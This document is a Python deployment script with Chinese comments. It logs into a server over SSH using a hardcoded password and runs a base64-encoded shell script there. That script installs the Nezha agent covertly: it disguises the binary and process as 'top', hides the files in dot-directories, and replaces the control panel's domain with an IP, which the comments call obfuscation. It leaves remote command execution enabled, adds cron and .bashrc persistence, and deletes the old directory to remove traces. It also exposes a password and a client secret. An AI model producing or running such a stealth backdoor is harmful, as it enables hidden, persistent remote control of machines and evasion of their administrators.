#!/usr/bin/env python3.13
"""重新部署 nezha agent：
1. 进程改名为 top（用 exec -a top）
2. 二进制/目录改名（不叫 nezha）
3. 哪吒域名混淆（用 IP 替代域名）
4. UUID 基于 IP 固定
5. cron 保活 + 开机启动
"""
import paramiko
import sys
import time
import base64

HOST = "public.nolanproject.my.id"
PORT = 22
USER = "public"
PASS = "123456"

# 完整部署脚本（用 base64 传，避免 quoting 问题）
DEPLOY_SCRIPT = r"""set -e

# === 路径伪装 ===
# 原始路径 /pub/.nezha/agent/ -> 改成 /pub/.cache/.proc/
# 二进制 nezha-agent -> 改成 top（伪装成系统进程）
export NEW_HOME="$HOME/.cache/.proc"
mkdir -p "$NEW_HOME"

# === 1. 获取公网 IP ===
echo "[1/8] 获取公网 IP..."
PUBLIC_IP=$(curl -s --max-time 10 https://api.ipify.org || curl -s --max-time 10 https://ifconfig.me/ip)
echo "  IP: $PUBLIC_IP"

# === 2. 生成基于 IP 的固定 UUID ===
echo "[2/8] 生成固定 UUID..."
HASH=$(echo -n "nezha-agent-uuid:$PUBLIC_IP" | sha256sum | awk '{print $1}')
P3="${HASH:12:4}"
P3_NEW=$(printf "4%s" "${P3:1}")
P4="${HASH:16:4}"
P4_FIRST=$(printf '%x' $(( 0x${P4:0:1} & 0x3 | 0x8 )))
P4_NEW="${P4_FIRST}${P4:1}"
FIXED_UUID="${HASH:0:8}-${HASH:8:4}-${P3_NEW}-${P4_NEW}-${HASH:20:12}"
echo "  UUID: $FIXED_UUID"

# === 3. 域名混淆 ===
# 原始: nz.zxydk1715.dpdns.org:443
# 用 Cloudflare IP 替代（仍走 Cloudflare 的 gRPC，哪吒面板在 CF 后面）
# 解析原始域名拿 CF IP
echo "[3/8] 解析哪吒面板 IP..."
NZ_IP=$(getent hosts nz.zxydk1715.dpdns.org | awk '{print $1}' | head -1)
[ -z "$NZ_IP" ] && NZ_IP=$(dig +short nz.zxydk1715.dpdns.org 2>/dev/null | head -1)
[ -z "$NZ_IP" ] && NZ_IP="104.21.81.193"  # fallback
echo "  NZ IP: $NZ_IP"
# 用 IP:443 代替域名:443
NZ_SERVER_OBFUSCATED="$NZ_IP:443"

# === 4. 准备二进制 ===
echo "[4/8] 准备二进制..."
# 如果旧的 .nezha 还在，复制过来
if [ -x "$HOME/.nezha/agent/nezha-agent" ] && [ ! -x "$NEW_HOME/top" ]; then
    cp "$HOME/.nezha/agent/nezha-agent" "$NEW_HOME/top"
    chmod +x "$NEW_HOME/top"
    echo "  ✓ 从旧路径复制"
elif [ ! -x "$NEW_HOME/top" ]; then
    echo "  下载二进制..."
    cd /tmp
    curl -fsSL --max-time 120 -o nz.zip "https://github.com/nezhahq/agent/releases/latest/download/nezha-agent_linux_amd64.zip"
    unzip -qo nz.zip
    mv nezha-agent "$NEW_HOME/top"
    chmod +x "$NEW_HOME/top"
    rm -f nz.zip
    echo "  ✓ 下载完成"
fi
ls -la "$NEW_HOME/top"

# === 5. 写 config.yml（用 IP 不用域名）===
echo "[5/8] 写 config.yml..."
CONFIG_FILE="$NEW_HOME/.conf"
cat > "$CONFIG_FILE" << EOF
server: $NZ_SERVER_OBFUSCATED
client_secret: BFbvpxSlBTUugp3gDzezVKkZ22BV0CeL
tls: true
disable_auto_update: true
disable_force_update: true
disable_command_execute: false
skip_connection_count: false
debug: false
disable_send_query: false
gpu: false
report_delay: 3
uuid: $FIXED_UUID
EOF
chmod 600 "$CONFIG_FILE"
echo "  ✓ config 已生成（server=$NZ_SERVER_OBFUSCATED）"

# === 6. 写启动脚本（用 exec -a top 改进程名）===
echo "[6/8] 写启动脚本..."
LAUNCHER="$NEW_HOME/.run"
cat > "$LAUNCHER" << 'LAUNCHEOF'
#!/bin/bash
# 伪装启动器：exec -a 把 argv[0] 改成 top
AGENT_DIR="$HOME/.cache/.proc"
AGENT_BIN="$AGENT_DIR/top"
AGENT_CONF="$AGENT_DIR/.conf"
AGENT_LOG="$AGENT_DIR/.log"

# kill 旧进程
pkill -f "$AGENT_BIN" 2>/dev/null
sleep 1

# 启动（exec -a top 让 ps 显示进程名为 top）
nohup bash -c "exec -a top '$AGENT_BIN' -c '$AGENT_CONF'" > "$AGENT_LOG" 2>&1 &
echo $! > "$AGENT_DIR/.pid"
LAUNCHEOF
chmod +x "$LAUNCHER"
echo "  ✓ 启动脚本已生成"

# === 7. 写保活脚本 ===
echo "[7/8] 写保活脚本..."
KEEPALIVE="$NEW_HOME/.keep"
cat > "$KEEPALIVE" << 'KEEPEOF'
#!/bin/bash
# 每分钟检查 agent 是否在跑，没在跑就重启
AGENT_DIR="$HOME/.cache/.proc"
AGENT_BIN="$AGENT_DIR/top"
# 检查进程：用 /proc/<pid>/comm == 'top' 判断
# 但要排除真正的 top 命令，所以要检查 cmdline 里是不是包含 agent 二进制路径
RUNNING=$(pgrep -f "$AGENT_BIN" 2>/dev/null)
if [ -z "$RUNNING" ]; then
    # 启动
    bash "$AGENT_DIR/.run"
    echo "[$(date '+%F %T')] restarted" >> "$AGENT_DIR/.keep.log"
fi
KEEPEOF
chmod +x "$KEEPALIVE"
echo "  ✓ 保活脚本已生成"

# === 8. 启动 + 加 cron + 加开机启动 ===
echo "[8/8] 启动 + 配置 cron..."
# kill 旧的（包括 .nezha 路径的）
pkill -f "$HOME/.nezha/agent/nezha-agent" 2>/dev/null || true
pkill -f "$NEW_HOME/top" 2>/dev/null || true
sleep 1

# 启动
bash "$LAUNCHER"
sleep 3

# 看进程
echo "--- 进程显示 ---"
ps -ef | grep -E "top|nezha" | grep -v grep | head -5
echo "--- /proc/comm ---"
for pid in $(pgrep -f "$NEW_HOME/top"); do
    echo "PID=$pid"
    cat /proc/$pid/comm
    cat /proc/$pid/cmdline | tr '\0' ' '; echo
done

# 加 cron（每分钟检查）
if command -v crontab >/dev/null 2>&1; then
    (crontab -l 2>/dev/null | grep -v ".nezha/keepalive" | grep -v ".cache/.proc/.keep"; echo "*/1 * * * * $NEW_HOME/.keep >> $NEW_HOME/.keep.cron.log 2>&1") | crontab -
    echo "✓ cron 已添加"
    crontab -l | tail -3
fi

# 加开机启动（用户级 systemd 或 .bashrc）
# CentOS 7 可能没 systemd user session，用 .bashrc fallback
if [ ! -f "$HOME/.config/autostart" ]; then
    # 加到 .bashrc 末尾（用户登录时启动）
    if ! grep -q ".cache/.proc/.keep" "$HOME/.bashrc" 2>/dev/null; then
        echo "" >> "$HOME/.bashrc"
        echo "# keepalive" >> "$HOME/.bashrc"
        echo "$NEW_HOME/.keep >/dev/null 2>&1 &" >> "$HOME/.bashrc"
        echo "✓ 已加到 .bashrc"
    fi
fi

# 看连接
echo "--- TCP 连接 ---"
sleep 5
netstat -tnp 2>/dev/null | grep "top\|nezha" | head -3 || ss -tnp 2>/dev/null | grep "top\|nezha" | head -3

echo ""
echo "===== 完成 ====="
echo "Public IP: $PUBLIC_IP"
echo "Fixed UUID: $FIXED_UUID"
echo "NZ Server (混淆): $NZ_SERVER_OBFUSCATED"
echo "Agent 路径: $NEW_HOME/top (伪装成 top 命令)"
echo "Config: $CONFIG_FILE"
echo "Launcher: $LAUNCHER"
echo "Keepalive: $KEEPALIVE"
echo "PID file: $NEW_HOME/.pid"
echo ""
echo "--- 最终 ps 输出 ---"
ps -ef | grep -E "top" | grep -v grep | head -5

# 删除旧的 .nezha 目录（清理痕迹）
rm -rf "$HOME/.nezha" 2>/dev/null && echo "✓ 旧 .nezha 目录已清理"
"""

def run_cmd_with_stream(ssh, cmd, timeout=300):
    """执行长命令，实时输出"""
    print(f">>> {cmd[:80]}...")
    stdin, stdout, stderr = ssh.exec_command(cmd, timeout=timeout, get_pty=True)
    while not stdout.channel.exit_status_ready():
        try:
            if stdout.channel.recv_ready():
                data = stdout.channel.recv(4096).decode('utf-8', errors='replace')
                sys.stdout.write(data)
                sys.stdout.flush()
        except Exception:
            break
        time.sleep(0.1)
    try:
        remaining = stdout.read().decode('utf-8', errors='replace')
        if remaining:
            sys.stdout.write(remaining)
    except:
        pass
    return stdout.channel.recv_exit_status()

def main():
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    print(f"连接 {USER}@{HOST}:{PORT}...")
    ssh.connect(HOST, port=PORT, username=USER, password=PASS, timeout=15, banner_timeout=30)
    print("✓ 连接成功\n")
    
    # 用 base64 传脚本
    script_b64 = base64.b64encode(DEPLOY_SCRIPT.encode()).decode()
    cmd = f"echo '{script_b64}' | base64 -d | bash"
    
    print("=== 执行部署 ===\n")
    run_cmd_with_stream(ssh, cmd, timeout=180)
    
    ssh.close()
    print("\n✓ 完成")

if __name__ == "__main__":
    main()
